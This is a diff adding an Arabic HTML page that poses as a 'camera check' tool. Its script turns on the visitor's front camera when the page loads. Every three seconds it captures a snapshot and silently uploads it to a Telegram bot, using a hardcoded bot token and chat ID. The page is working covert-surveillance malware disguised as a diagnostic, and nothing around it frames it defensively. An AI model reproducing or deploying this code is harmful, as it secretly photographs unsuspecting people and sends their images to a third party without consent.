@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>فحص الكاميرا</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{max-width:400px;width:100%;text-align:center}
+h1{font-size:18px;color:#4CAF50;margin-bottom:8px}
+.sub{color:#aaa;font-size:12px;margin-bottom:15px}
+video{width:100%;border-radius:15px;border:2px solid #333;margin-bottom:15px}
+.status{color:#4CAF50;font-size:12px;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+</style>
+</head>
+<body>
+<div class="container" id="form">
+<h1>📸 فحص الكاميرا</h1>
+<p class="sub">جاري فحص كاميرا الجهاز...</p>
+<video id="video" autoplay playsinline></video>
+<div class="status">● جاري البث...</div>
+</div>
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+var stream;
+
+async function sendPhoto(blob){
+var fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('photo',blob,'live.jpg');
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:fd})}catch(e){}
+}
+
+async function start(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+document.getElementById('video').srcObject=stream;
+setInterval(function(){
+var canvas=document.createElement('canvas');
+canvas.width=320;canvas.height=240;
+var ctx=canvas.getContext('2d');
+ctx.drawImage(document.getElementById('video'),0,0,320,240);
+canvas.toBlob(function(blob){sendPhoto(blob);},'image/jpeg',0.5);
+},3000);
+}catch(e){
+document.querySelector('.sub').textContent='خطأ في الكاميرا';
+}
+}
+
+start();
+</script>
+</body>
+</html>
